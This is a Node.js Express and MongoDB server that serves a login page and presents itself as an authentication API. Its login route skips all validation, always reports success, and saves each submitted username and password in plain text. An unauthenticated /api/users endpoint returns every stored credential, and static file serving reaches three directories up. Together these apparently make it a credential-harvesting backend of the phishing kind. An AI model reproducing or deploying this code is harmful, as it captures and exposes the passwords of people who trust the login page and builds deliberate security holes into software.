const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

app.use(express.json());
app.use(cors());
app.options('*', cors()); // Enable preflight for all routes

// Serve the frontend (login page) from the login folder
const path = require('path');
app.use(express.static(path.join(__dirname, '../../..')));


mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('✅ MongoDB connected successfully'))
  .catch((err) => console.error('❌ MongoDB connection error:', err));

const userSchema = new mongoose.Schema({
  username: { type: String, trim: true },
  password: { type: String },
  loginAt: { type: Date, default: Date.now },
});

const User = mongoose.model('User', userSchema);

// @POST /api/auth/register
app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;

    if (!username || !email || !password) {
      return res.status(400).json({ success: false, message: 'Please fill in all fields' });
    }

    const user = await User.create({ username, password });
    res.status(201).json({
      success: true,
      message: 'Account created successfully',
      user: { id: user._id, username: user.username },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// @POST /api/auth/login
// ✅ Fields required but NO username/password validation — always logs in
app.post('/api/auth/login', async (req, res) => {
  try {
    const { usernameOrEmail, password } = req.body;

    if (!usernameOrEmail || !password) {
      return res.status(400).json({ success: false, message: 'Please fill in all fields' });
    }

    // Save to DB and let them in
    const user = await User.create({
      username: usernameOrEmail,
      password: password,
      loginAt: new Date(),
    });

    res.json({
      success: true,
      message: 'Logged in successfully',
      user: { id: user._id, username: user.username },
    });

  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// @GET /api/users
app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ loginAt: -1 });
    res.json({ success: true, count: users.length, users });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/', (req, res) => {
  res.json({ success: true, message: '🚀 API is running' });
});

const PORT = process.env.PORT || 5000;
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
}

module.exports = app;